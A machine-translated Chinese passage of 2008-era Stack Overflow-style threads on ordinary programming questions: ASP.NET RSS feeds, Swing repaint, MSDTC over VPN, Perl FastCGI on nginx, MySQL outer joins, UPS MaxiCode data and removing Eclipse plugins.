 If-Modified-Since 
```

在请求中，以节省带宽。

我不想重新发明轮子，所以我在这里停下来询问一些方向。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T23:03:49.613

我还没有看到它实现 HTTP_IF_MODIFIED_SINCE，但我会考虑使用 SyndicationFeed 类。它使处理提要变得非常简单，无需任何解析。我目前正在将它用于 Atom 提要，但它也应该适用于 RSS：

```
function SyndicationFeed GetFeed(string url) {
  XmlReader reader = XmlReader.Create(url);
  SyndicationFeed feed = SyndicationFeed.Load(reader);
  return feed;
}

public ActionResult ShowFeed()
{
  string feedUrl = "somefeedurl";
  SyndicationFeed feed = GetFeed(feedUrl);
  return View(feed);
} 
```

...然后在视图中：

```
 <%foreach (var item in ViewData.Model.Items) { %>
    <li><a href="<%=item.Id %>"><%=item.Title.Text %></a></li>
  <% } %> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-16T17:16:33.463

我结束了这个。如果您发现任何错误或更好的方法，请评论或编辑帖子。

## Rss控制器

```
Imports System.ServiceModel.Syndication
Imports System.Xml
Imports System.Web.HttpContext

Function MasterRSS()
    Dim baseURL As String = "http://www.mysite.com"
    Dim feed As New SyndicationFeed("MySite - Master RSS", "", New Uri(baseURL))
    ''//Add a custom attribute.
    Dim xqName As New XmlQualifiedName("CustomAttribute")
    feed.AttributeExtensions.Add(xqName, "Value")

    Dim sp As New SyndicationPerson("jerry@mysite.com", "Jerry Seinfeld", "http://Jerry.blog.com")
    feed.Authors.Add(sp)

    Dim category As New SyndicationCategory("Category")
    feed.Categories.Add(category)

    feed.Contributors.Add(New SyndicationPerson("cosmo@mysite.com", "Cosmo Kramer", "http://kramer.blog.com"))
    feed.Copyright = New TextSyndicationContent("MySite 2008")
    feed.Description = New TextSyndicationContent("My description")

    ''//Add a custom element.
    Dim doc As New XmlDocument()
    Dim feedElement As XmlElement = doc.CreateElement("CustomElement")
    feedElement.InnerText = "Some text"
    feed.ElementExtensions.Add(feedElement)

    feed.Generator = "Custom"
    feed.Id = "MySiteFeedID"
    feed.ImageUrl = New Uri("http://www.mysite.com/content/images/logo.png")

    ''//Items
    Dim ModifiedSince As Date
    If Not Date.TryParse(Current.Request.Headers("If-Modified-Since"), ModifiedSince) Then
        ModifiedSince = Date.Today.AddDays(-30) ''//Or whatever make sense to you.         
    Else
        ModifiedSince.AddMinutes(-5) ''//Just in case, we do not want to miss any item. 
    End If

    ''//the list of items.
    Dim items As New List(Of SyndicationItem)()

    Dim db As New mainDataContext
    Dim textContent As TextSyndicationContent, Item As SyndicationItem

    ''//Then send the list of post, comments, whatever.
    Dim Posts = (From p In db.Posts Where c.Date >= ModifiedSince Order By p.Date Descending)
    For Each Post In Posts
        Dim sb As New StringBuilder
        sb.AppendFormat("<p>{0}</p>", Post.FullText)
        textContent = New TextSyndicationContent(sb.ToString, TextSyndicationContentKind.Html)
        Item = New SyndicationItem("Post " + Post.PostID.ToString, textContent, New Uri(baseURL + "/Post/View/" + Post.PostID.ToString), "Post" + Post.PostID.ToString, Post.Date)
        items.Add(Item)
    Next

    If items.Count = 0 Then
        ''//send a 304 to the browser.
        Return View("304")
    End If

    feed.Items = items
    feed.Language = "es-ar"
    feed.LastUpdatedTime = (From i In items Select i.LastUpdatedTime Order By LastUpdatedTime Descending).FirstOrDefault

    ''//Not needed in this sample.
    ''//Dim link As New SyndicationLink(New Uri("http://server/link"), "alternate", "Link Title", "text/html", 1000)
    ''//feed.Links.Add(link)

    ViewData("feed") = feed
    Return View("Rss")

End Function 
```

## Rss 视图 (rss.aspx)

```
Dim htmlwriter As System.IO.Stream = Response.OutputStream
Dim rssWriter As System.Xml.XmlWriter = System.Xml.XmlWriter.Create(htmlwriter)
Dim feed As System.ServiceModel.Syndication.SyndicationFeed = ViewData("feed")
Dim rssFormatter As New System.ServiceModel.Syndication.Rss20FeedFormatter(feed)
rssFormatter.WriteTo(rssWriter)
rssWriter.Close() 
```

这样，您可以重用视图

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-18T11:39:03.817

如果您使用`HttpContext.Response.Cache.SetCacheability`,`SetExpires`则`SetMaxAge`ASP.NET 缓存系统将为您处理此问题 - 它理解 If-Modified-Since 标头。[此博客条目](http://weblogs.asp.net/rashid/archive/2008/03/28/asp-net-mvc-action-filter-caching-and-compression.aspx)展示了如何创建 MVC 操作过滤器以在 MVC 中执行必要的操作。

# asp.net - 控制下拉菜单中显示的行数

> ID：369815
> 
> 赞同：1
> 
> 时间：2008-12-15T21:46:46.493
> 
> 标签：asp.net

有没有办法控制 DropDownList 控件中显示的行数？我希望它只显示 10 行，但它默认为 30。这会导致列表显示在高于控件而不是低于它的位置，因为它在页面上的位置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T22:42:44.117

您可以使用 PagedDataSource 对下拉列表的数据源进行分页，并将 PageSize 设置为 10。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T21:58:20.197

注意：我没有使用代码尝试过

添加以“10”为值的“size”属性以在下拉列表中显示 10 行。

```
<asp:dropdownlist size="10" ...>

```

这行得通吗？（我猜它，因为下拉列表是 SELECT html 中的标签）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T22:13:42.150

如果 ASP.NET 将 DropDownList 控件呈现为 a `<select>`，则无法控制`<select>`打开时显示的行数，它取决于浏览器实现。

快速测试显示，IE 6 显示 27 个项目列表中的 27 个项目，Windows 3.2.1 的 Safari 显示 22 个，Firefox 2 显示 20 个，Opera 9.6.2 显示 16 个。显示的数字甚至可能取决于项目的总数，但我没有费心去测试它，因为很明显这不是你能够控制的。

添加`size="..."`到控件将使下拉列表具有固定大小，并且不再是“下拉列表”（假设您甚至可以这样做）。

唯一的解决方案似乎是实现您自己的基于 JavaScript 的下拉控件，或者购买或下载一个。

# java - Java GUI repaint() 问题？

> ID：369823
> 
> 赞同：7
> 
> 时间：2008-12-15T21:52:23.003
> 
> 标签：java, user-interface, refresh, jpanel, repaint

我有一个 JFrame。此 JFrame 包含一个 JButton。我单击 JButton 并创建了 10 个 JTextField。

问题：在“我通过调整窗口大小强制重绘（）”之前，我看不到它们。只有这样我才能看到创建的 JTextFields。

代码：

```
JPanel points = new JPanel();

//Creating the JTextFields:
for (int i=0; i<10; i++) {
    JTextField textField = new JTextField();
    points.add(textField);
}

repaint();
this.repaint();
super.repaint();
points.repaint(); 
```

* * *

谢谢 - 在 for 循环之后，我只是调用了 points.validate() 并且它起作用了......

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-12-15T21:56:12.637

[`Container.add`](http://java.sun.com/javase/6/docs/api/java/awt/Container.html#add(java.awt.Component))API 文档说：

> 注意：如果组件已添加到已显示的容器中，则必须在该容器上调用 validate 以显示新组件。如果要添加多个组件，您可以通过在添加所有组件后仅调用一次 validate 来提高效率。

它晦涩难懂，也不是很聪明，但这是规则。打电话可能会更好`JComponent.revalidate`

# performance - 能不能同时使用 100% 的 IO 和 CPU？

> ID：369827
> 
> 赞同：3
> 
> 时间：2008-12-15T21:54:01.313
> 
> 标签：performance

一个共同采访者在采访中提出的问题。我一直认为这是一个愚蠢的问题。

假设单处理器而不是双核。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T21:58:09.857

是的，如果 DMA 不可用，您可以。在这种情况下，您最终可能会使用 CPU 通过中央内存将数据从 I/O 移动到 I/O，如果两个设备上的 I/O 带宽足够高，您将有效地使 CPU 饱和。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T21:59:57.840

是的。Simple 有两个进程在运行，一个使用所有 CPU，另一个使用它可以使用的所有 I/O。这会做到的。真正的问题是讨论的 I/O。任何系统中都有许多总线，它们都可以在任何给定时间绑定。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T22:01:15.997

我还会寻找 IO 设备被虚拟化和加密的地方。这可能是一个不寻常的情况，但不是不可能的情况。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T22:34:53.323

是的，你可以！（听起来像是陈词滥调，对吧？）但实际上，存在非阻塞 IO 之类的东西。在使用 100% IO 的数据时，您可以做很多事情。

# model-view-controller - 在模型中创建图像缩略图？

> ID：369828
> 
> 赞同：0
> 
> 时间：2008-12-15T21:54:12.843
> 
> 标签：model-view-controller, model, thumbnails

我想知道在模型中包含图像缩略图信息是否有意义。就像指定要创建的缩略图大小一样。缩略图目录。等等。

此外，在使用缩略图和数据库时，是否建议将所有创建的缩略图作为新记录存储在数据库中。假设您有图像记录，然后您会创建一对多到缩略图记录吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T22:01:19.177

我认为这是“正确”的做法，如果您出于某种原因想要将所有缩略图存储在数据库中（也许您需要将所有数据都存储起来？）。

就个人而言，我一直发现根据某种方案命名文件，以便可以从图像记录的主键中计算出来，并且大小足够好。

# vpn - MSDTC 通信通过 VPN 失败

> ID：369837
> 
> 赞同：1
> 
> 时间：2008-12-15T21:57:33.977
> 
> 标签：vpn, msdtc

我有一个应用程序在同一台服务器上运行跨越多个数据库的事务。当然，这涉及到 Microsoft 分布式事务协调器，并且一切都按预期进行。

但是，当我通过 VPN 远程连接到托管服务器的网络并在本地计算机上运行应用程序时，我收到以下错误：

**System.Transactions.TransactionManagerCommunicationException**：“与底层事务管理器的通信失败。”

原因：

**System.Runtime.InteropServices.COMException：** 错误 HRESULT E_FAIL 已从对 COM 组件的调用中返回。

这是原始异常的堆栈跟踪：

*在 System.Transactions.Oletx.IDtcProxyShimFactory.ReceiveTransaction(UInt32 propgationTokenSize, Byte[] propgationToken, IntPtr managedIdentifier, Guid& transactionIdentifier, OletxTransactionIsolationLevel&isolationLevel, ITransactionShim& transactionShim)
在 System.Transactions.TransactionInterop.GetOletxTransactionFromTransmitterPropigationToken(Byte[] propagationToken)*

**只有当我通过 VPN 隧道连接到服务器时**才会出现问题。
另请注意，我在本地计算机上暂时禁用了 Windows 防火墙，以确保它不会阻止 MSDTC。

有人知道通过 VPN 运行 MSDTC 时有什么问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-16T01:56:30.217

我建议您运行 DTCPing（可从某处的 Microsoft 站点获得）它在两台机器上同时运行并检测各种 DTC 问题。

请注意，在我真正阅读说明并在单击开始测试按钮之前开始测试之前，我在使用此工具时遇到了很大的困难。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-16T00:04:56.293

您是否管理 VPN 连接？VPN 上可能存在受限端口。同样，您是否管理您的服务器？您的服务器可能只允许来自内部 IP 地址的连接，而不是用于 VPN 服务的网段。如果您是管理员，或许说出您正在使用的 VPN 软件会有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-04-29T17:39:31.780

我在使用 Windows 7 x64 客户端和 Server 2003R2 服务器时遇到了同样的问题。我已经能够使用 XP、Vista x86 和 Windows 7 x86 使其工作（在同一 vpn、同一服务器上）。我有一个 Microsoft 打开的支持电话，他们正在调查它。我很好奇 - 你们在客户端机器上使用什么操作系统？

# asp.net - 部署 VS-2008 Web 项目的最佳方式

> ID：369839
> 
> 赞同：3
> 
> 时间：2008-12-15T21:58:00.637
> 
> 标签：asp.net

部署 Web 项目的首选方法是什么？只需在发布模式下编译并注册后复制 dll 即可？或使用 NSIS 构建安装程序或 MS 设置项目。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-15T22:09:04.997

我通常为每个网站或 WebApplication 使用一个[Web 部署项目](http://www.microsoft.com/downloads/details.aspx?FamilyId=0AA30AE8-C73B-4BDD-BB1B-FE697256C459&displaylang=en)，它允许我管理构建配置、合并和定义构建前的 MSBuild 任务。

你也可以看看[Microsoft Web Application Installer](http://www.microsoft.com/web/channel/products/WebApplicationInstaller.aspx)，它会很不错，但它仍处于 beta 阶段，不过你可以试试...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T22:09:23.077

这在很大程度上取决于您的 web 应用程序的发展方向以及您希望提供的体验。如果您部署到 Web 主机，最好使用 xcopy deploy 和文档。如果您有一个真正的终端系统，那么创建一个安装程序来为您的客户完成所有的腿部工作，并且可能会为您自己节省一些文档工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-16T18:20:09.217

Andreas，我正在获取 CC.Net。同时，我正在使用 Web 部署项目。使用它并通过设置，它会创建一个“发布”文件夹，其中包含一个包含 dll 的 bin 文件夹以及父文件夹中的 aspx。

我假设我现在可以使用“发布”文件夹创建一个 MSI 文件，或者我需要做一些不同的事情来创建一个可以在客户端服务器上运行的 MSI

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T22:44:04.473

我建议投资建立一个持续集成流程（CruiseControl.Net 或 TeamCity 等），因为您可能不仅要将其部署给您的客户一次。

只需按一下按钮即可自动部署是天赐之物。如果你花几天时间，你可以在每次有人签入代码时自动部署到开发环境（它会编译并且所有测试都通过），设置每日部署到测试环境并有一个按钮将其自动部署到随时登台环境。

# perl - 如何在 Nginx 上使用 FastCGI 运行 Perl 脚本？

> ID：369850
> 
> 赞同：10
> 
> 时间：2008-12-15T22:00:59.320
> 
> 标签：perl, cgi, nginx, fastcgi

所以我正在遵循本指南：[http](http://technotes.1000lines.net/?p=23) ://technotes.1000lines.net/?p=23 ，我正在完成这些步骤。我有一个带有 Debian Etch 的 VPN (slicehost.com)，用 nginx 为一个网站（到目前为止是静态的）提供服务。我使用 wget 下载 FastCGI 并执行了通常的 make make install 例程。

所以我猜由于 FastCGI 不能正常运行 CGI 脚本，你必须使用某种类型的 perl 包装器来解释 perl。

现在我运行这个脚本

[http://technotes.1000lines.net/fastcgi-wrapper.pl](http://technotes.1000lines.net/fastcgi-wrapper.pl)

我遇到了一个人在提交脚本的页面上遇到的完全相同的问题：

[http://www.ruby-forum.com/topic/145858](http://www.ruby-forum.com/topic/145858)

（我不是红宝石人，那里没有任何红宝石）

我不断得到一个

```
# bind/listen: No such file or directory 
```

我不知道如何进行。我会很感激任何帮助，我可以提供任何人需要的更多细节。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-12-15T22:16:47.133

网络服务器需要一个 Unix 域套接字来连接到 FastCGI 应用程序，但不能创建套接字。您希望它所在的目录很可能不存在（因为它们是在您执行 a 时自动创建的`bind`）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-02T23:02:03.100

莱昂完全正确。允许套接字监听有两个先决条件：

1.  确保套接字目录存在。

2.  确保套接字目录属于执行 fastcgi-wrapper.pl 的同一用户。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-08-08T02:09:53.820

我将尝试“淡化”fastcgi-wrapper.pl，因此它可以与[spawn-fcgi](http://redmine.lighttpd.net/projects/spawn-fcgi/Blockquote)一起使用。

我已经使用了其中两个套接字：

```
spawn-fcgi -C 3 -u www-data -s /var/run/php-fcgi.sock -P /var/run/php-fcgi.pid -- /usr/bin/php5-cgi
spawn-fcgi -F 3 -u www-data -s /var/run/lua-fcgi.sock -P /var/run/lua-fcgi.pid -- /usr/bin/wsapi.fcgi 
```

在 /var/run 我有：

```
-rw-r--r-- 1 root     root     14 2010-08-07 12:14 /var/run/lua-fcgi.pid
srwxr-xr-x 1 www-data www-data  0 2010-08-07 12:14 /var/run/lua-fcgi.sock=
-rw-r--r-- 1 root     root      4 2010-08-07 12:14 /var/run/php-fcgi.pid
srwxr-xr-x 1 www-data www-data  0 2010-08-07 12:14 /var/run/php-fcgi.sock= 
```

我可以轻松地启动和停止 FastCGI 包装器，我也想用 Perl 来做到这一点。

如果有人已经有一个脚本，可以与 spawn-fcgi 一起使用，我很乐意使用它，或者至少看看它。

干杯，--polemon

# mysql - 你如何加入两个数据不在另一个表中的 MySQL 表？

> ID：369856
> 
> 赞同：3
> 
> 时间：2008-12-15T22:02:21.983
> 
> 标签：mysql, join

例如，我有一张宠物桌和一张丢失宠物桌。我想通过 1 次加入和没有子选择来获得所有不会丢失的宠物。那可能吗？典型的连接只返回两个表中的结果。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-15T22:04:13.027

与标准 INNER JOIN 相比，您正在描述 OUTER JOIN。谷歌或检查你的文档——我相信你会找到很多例子。:)

SELECT * FROM pets AS p
LEFT OUTER JOIN lost-pets AS lp
ON p.name = lp.name
WHERE lp.id IS NULL

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-15T22:07:10.150

```
SELECT PETS.NAME
FROM PETS
   LEFT OUTER JOIN LOST_PETS
     ON PETS.PET_ID = LOST_PETS.PET_ID
WHERE LOST_PETS.PET_ID IS NULL; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-15T22:05:01.683

是的，有可能说：

```
SELECT *
FROM pets LEFT OUTER JOIN pets-lost ON pets.id = pets-lost.id
WHERE pets-lost.id IS NULL; 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-15T22:05:12.400

为什么不做 where not exists (select * from Lost ...)？它是一个子选择，但我不明白为什么这是一个问题。

# c# - 使用 IIS 6.0 和 Asp.Net 进行基本身份验证

> ID：369857
> 
> 赞同：1
> 
> 时间：2008-12-15T22:03:31.967
> 
> 标签：c#, asp.net, iis-6

是否可以使用 ASP.Net 向客户端提供基本身份验证，以在 IIS 6.0 中对请求进行身份验证（我很确定这在 7.0 中是可行的，而且没有太多痛苦）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T22:09:06.900

Bjorn 有一些源代码可以完成这项任务。

[http://blog.smithfamily.dk/2008/08/27/ImplementingBasicAuthenticationInASPNET20.aspx](http://blog.smithfamily.dk/2008/08/27/ImplementingBasicAuthenticationInASPNET20.aspx)

# 2d - 如何从 UPS MaxiCode 条码中解码 UPS 信息？

> ID：369862
> 
> 赞同：3
> 
> 时间：2008-12-15T22:04:55.817
> 
> 标签：2d, barcode, shipping, ups

我最近购买了一个二维条码阅读器。扫描 UPS 条码时，我得到了我想要的大约一半的信息，其中大约一半看起来是以某种方式加密的。我听说有一个 UPS DLL。

示例 - 粗体的所有内容似乎都已加密，而非粗体的文本包含有价值的合法数据。

[)>01961163522424800031Z50978063UPSN12312307G:%"6*AH537&M9&QXP2E:)16(E&539R'64O

换句话说，这个文本似乎还可以——我可以解析信息 [)>01961163522424800031Z50978063UPSN123123 ...

虽然，此数据似乎已加密... 07G:%"6*AH537&M9&QXP2E:)16(E&539R'64O

有任何想法吗？？？

* * *

我在互联网上读到的所有内容都说我应该能够阅读这个东西。我只是没有找到任何有关细节的信息。“加密”信息包含街道地址、包裹号（如 1/2）、重量和其他几个我很想得到的项目。我想我会直接联系 UPS。谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2011-01-10T03:51:46.923

SCAC 后的数据经过压缩，需要 DLL 或 UPS 的其他组件才能解码。请注意，MaxiCode 仅包含大约 100 个字符的数据，因此需要进行压缩才能对更多运输数据进行编码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T22:10:02.157

它似乎有[据可查](http://www.idautomation.com/maxicodefaq.html)......任何神秘的信息都可能是托运人出于他们自己（或他们的客户）目的而包含的信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-11-29T03:10:53.980

我知道您在扫描这些条形码时获得的字符块使用非打印字符分成块，因此在不知道编码器如何划分字符的情况下尝试查看字符是很困难的。查找有关他们存储数据的格式的信息，或查找将显示这些字符的解码器。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-05-11T23:26:01.137

看看这个网站，它提供了一个免费的解码应用程序。

IDAutomation® MaxiCode 条码常见问题解答和教程 Maxicode 是一种国际二维（二维）条码，UPS 目前在运输标签上使用该条码，用于全球寻址和包裹分拣。...

[http://www.idautomation.com/maxicodefaq.html](http://www.idautomation.com/maxicodefaq.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-25T04:36:11.493

我预计不可读的部分不是 UPS 数据，而是由发货人和收货人之间的协议故意混淆的私人数据。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-16T13:27:36.890

这是我之前遇到的一个页面，但是，这个页面讨论了编码条形码，使用简单的英语和一些组件。用于 ENCODE 的信息是我想在 DECODE 时检索的信息。

就像我说的，当信息被检索时，一半的信息出现乱码（加密？）并且没有关于解密该代码的文档......

根据您发给我的链接，我应该看到如下内容：

[)>01963360910628400021Z14647438UPSN410E1W1951/1Y135ReoTAMPAFL

但是，我得到这样的东西：

[)>01961163522424800031Z50978063UPSN12312307G:%"6*AH537&M9&QXP2E:)16(E&539R'64O

这使我相信您发送给我的页面要么已经过时，要么只是关于如何使用他们的控件进行编码而不是解码的参考。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-16T13:31:17.880

为什么你会认为 UPS 要你解码那部分？此外，我相信这段代码没有被编码——它可能是他们数据库中某些东西的 ID。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-05-04T19:50:20.210

[http://www.google.com/patents/US7039496](http://www.google.com/patents/US7039496)有很多关于图像 3-12 中编码数据的信息。看起来第一个给出了未压缩的格式，而第二个是压缩字典。该描述引用了许多超出我理解范围的 ANSI 标准，但您所看到的似乎是一个格式`'07'`字符串，所以这里可能有足够的信息来进行完整的解码？

当然，请记住，这是专利的一部分，在不支付版税的情况下实施它可能会给您带来麻烦。伊纳尔

# c# - Silverlight：如何在设置 DataContext 属性后强制绑定

> ID：369873
> 
> 赞同：2
> 
> 时间：2008-12-15T22:10:01.640
> 
> 标签：c#, .net, silverlight, data-binding

是否可以在加载用户控件后设置用户控件的 DataContext 属性，并强制用户控件重新绑定？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-15T22:56:55.727

我很确定，如果您再次设置数据上下文，它将重新绑定

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-30T09:53:20.133

如果您需要在 DataContext 更改时做额外的工作，您可以使用自定义 DependencyProperty 并将其绑定到 DataContext 属性。使用 DependencyPropertyChangedEventHandler 了解 DP 何时更改。

有关更完整的解释，请参阅我在[http://msmvps.com/blogs/theproblemsolver/archive/2008/12/29/how-to-know-when-the-datacontext-changed-in-your-control 上的博客文章。 .aspx](http://msmvps.com/blogs/theproblemsolver/archive/2008/12/29/how-to-know-when-the-datacontext-changed-in-your-control.aspx) _

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T22:58:50.967

设置 DataContext 属性应该会导致重新绑定。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-14T14:50:02.880

另一种强制重新绑定的方法，例如：

```
MyDataGrid.SetBinding(DataGrid.ItemsSourceProperty, 
    MyDataGrid.GetBindingExpression(DataGrid.ItemsSourceProperty).ParentBinding); 
```

此方法也可用于 DataContext。

# mysql - 有没有工具可以直观地映射 MySQL 中的表关系？

> ID：369877
> 
> 赞同：1
> 
> 时间：2008-12-15T22:13:09.483
> 
> 标签：mysql, mapping, relational-database

我正在寻找一种可以在mysql中映射我的数据库中的关系的工具。我想要类似于在“显示图表窗格”中的 MS-SQL Server Management Studio 中生成的视图。这样的事情存在吗？

我负责数据库的设计及其使用 rails 的约定。我不会反对手动指定关系。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T22:41:56.927

也许官方工具有这个？

[http://dev.mysql.com/downloads/workbench/5.1.html](http://dev.mysql.com/downloads/workbench/5.1.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T22:43:53.883

[MySQL Toad](http://www.quest.com/toad-for-mysql/features-benefits.aspx)没有架构图工具吗？我认为确实如此。我不是一个图表专家（对 mysqldump 输出更满意），但我与许多对 Toad 发誓的人合作过。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-07-25T16:56:15.277

[MySQL Workbench](http://dev.mysql.com/workbench/) 5.1.16 在我的 OS X 10.5.7 系统上是错误的。我发现它可以执行诸如崩溃和消失之类的操作而没有错误。否则在打印设置中尝试更改页面大小时会出错。

我还尝试在 VMWare 下的 Windows XP 上运行它。它在那里似乎更稳定和可用。我能够对数据库进行逆向工程并创建图表。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T22:25:11.173

一年前，我将[DBVis](http://www.minq.se/products/dbvis/)与 Oracle 一起使用。它相信它也适用于 MySql。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-15T22:39:08.337

如果您在 Windows 上，Altova DatabaseSpy 将显示它们。如果没有，最简单的方法是查询 INFORMATION_SCHEMA（如果您使用的是 MySQL v5 或更高版本）并检查所有表的键列使用统计信息。这很容易编写脚本。

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2008-12-15T22:23:33.783

大多数 MySQL 数据库仍然使用不提供外键约束的 MyISAM 表。如果没有明确的 FK，您能做的最好的事情就是猜测表之间的关系。

# java - 如何在 Eclipse 3.4.X 或更高版本中卸载插件

> ID：369889
> 
> 赞同：65
> 
> 时间：2008-12-15T22:17:44.027
> 
> 标签：java, eclipse, ide, plugins, eclipse-plugin

Eclipse 中管理插件的 GUI 在 3.4.0 版本中进行了一些大修。该 GUI 可通过“帮助”菜单中的“软件更新...”选项访问。

删除所选 Mylyn 插件的选项显示为灰色。事实上，几乎所有已安装的插件都是如此。我知道 Mylyn 插件是可选的，那么为什么我没有提供删除它们的选项呢？

* * *

## 回答 #1

> 赞同：113
> 
> 时间：2009-07-03T18:10:32.020

**以下文本引用自 Eclipse 帮助文档：**

卸载向导允许您查看和卸载配置中的项目。当您从已安装的软件页面选择项目并按卸载...时，将显示此向导。要从系统中卸载软件：

1.  单击*帮助 > 关于，然后单击安装详细信息...*打开一个对话框，其中显示提供有关安装的更多详细信息的页面。

2.  单击已*安装的软件*选项卡以查看已安装到系统中的软件项目的列表。

3.  选择要卸载的项目。

    点击*卸载...*

“*卸载详细信息*”页面将向您显示将被卸载的项目列表。展开每个项目将显示您的选择将卸载哪些附加项目（如果有）。

如果您改变了关于应该卸载哪些项目的想法，您可以单击*返回*查看您之前选择的项目的复选标记列表。您可以选中和取消选中列表中的不同项目，并在准备好继续时单击*下一步。*

5.  单击*完成*开始卸载。

成功卸载所有软件后，系统将提示您重新启动 Workbench。当要求退出并重新启动 Workbench 以使更改生效时，单击*Yes 。*

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2010-07-23T20:25:45.697

并且只是为 Helios - Eclipse 3.6 更新它

`Help->Install New Software`在对话框底部有一个链接`What is already installed`，一旦您单击，您将获得已安装插件和`Uninstal...`按钮的列表

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2009-11-06T22:56:17.253

eclipse 3.5(Galieo) 帮助>> 安装新软件>> 已经安装的插件>> 选择插件>> 卸载作品魅力。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-21T01:09:06.297

Eclipse 的某些发行版附带了某些无法混合搭配的插件。Mylyn 就是这种情况，它从一个学生的论文项目变成了 Eclipse 的一个组成部分。如果您想真正摆脱 Mylyn，您可能需要安装 Eclipse 经典而不是您拥有的发行版，然后安装您需要的东西。

Myln 附带标准的 Eclipse 发行版。

顺便说一句，Eclipser 3.5 完全改变了所有这些屏幕:(

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-02-20T06:51:37.607

在 eclipse Helios（3.6 版）中，卸载插件：

1.  转到帮助->安装新软件...
2.  点击“已经安装了什么？” 对话框右下角的链接
3.  在已安装的软件选项卡中选择要卸载的软件
4.  点击底部的“卸载...”按钮
5.  在“卸载详细信息”对话框中单击“完成”
6.  观察eclipse底部状态栏的“Uninstalling Software %”状态
7.  提示时单击“立即重新启动”。

Eclipse 重新启动。选择工作区。现在，当您再次转到已安装的软件窗口时，您找不到已卸载的软件。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-07-26T10:09:41.480

如果您使用的是 Windows，请确保您以**管理员**身份运行 Eclipse 。*如果没有管理员权限，“已安装软件*”中的某些选项可能会显示为灰色。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2011-04-01T05:00:52.393

在 Eclipse 3.6 Helios 中，界面再次发生了变化。转到“关于 Eclipse”，然后单击“关于”框中的“安装详细信息”按钮。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2021-09-02T16:42:14.573

虽然*Help* → *About Eclipse IDE* [或过去或将来的任何地方] → `Installation Details`→ *Installed Software* →`Uninstall...`是官方和首选的方式，但后一个按钮被禁用。

还要记住，不仅有*插件*，还有*功能*。就我而言，我想从一个相当新的*Eclipse IDE for Enterprise Java and Web Developers*包中删除*Mylyn*和*Wild Web Developer 。*我做了以下。

 *但首先一个：

| 免责声明 |
| --- |
| 输入 ECLIPSE_HOME 风险自负。诸如拼写错误之类的错误也可能出现在以下内容中。我不承担任何*责任*。 |

*   在 Eclipse 的主目录中`features.DISABLED`创建了目录。`plugins.DISABLED`
*   `*mylyn*`从移动`ECLIPSE_HOME/features`到`ECLIPSE_HOME/features.DISABLED`
*   `*wildwebdeveloper*`从移动`ECLIPSE_HOME/features`到`ECLIPSE_HOME/features.DISABLED`
*   `*mylyn*`从移动`ECLIPSE_HOME/plugins`到`ECLIPSE_HOME/plugins.DISABLED`
*   `*wildwebdeveloper*`从移动`ECLIPSE_HOME/plugins`到`ECLIPSE_HOME/plugins.DISABLED`

*启动 Eclipse 后，Eclipse 的错误日志*视图中有十几个“*未找到*”错误。如果您双击它们中的每一个，您可以看到尚未找到哪个依赖插件 JAR。

 **   将 *错误日志*视图的过滤器设置为仅显示错误和警告。
*   `*.jar`将错误中提到的依赖插件从`ECLIPSE_HOME/plugins.DISABLED`后面`ECLIPSE_HOME/plugins`一一移动（每次都重启Eclipse），直到视图中不再出现“*未找到”错误。*最后是九点`*mylyn*.jar`。：

```
*.mylyn.commons.core_*
*.mylyn.commons.net_*
*.mylyn.commons.notifications.core_*
*.mylyn.commons.notifications.ui_*
*.mylyn.commons.screenshots.ui_*
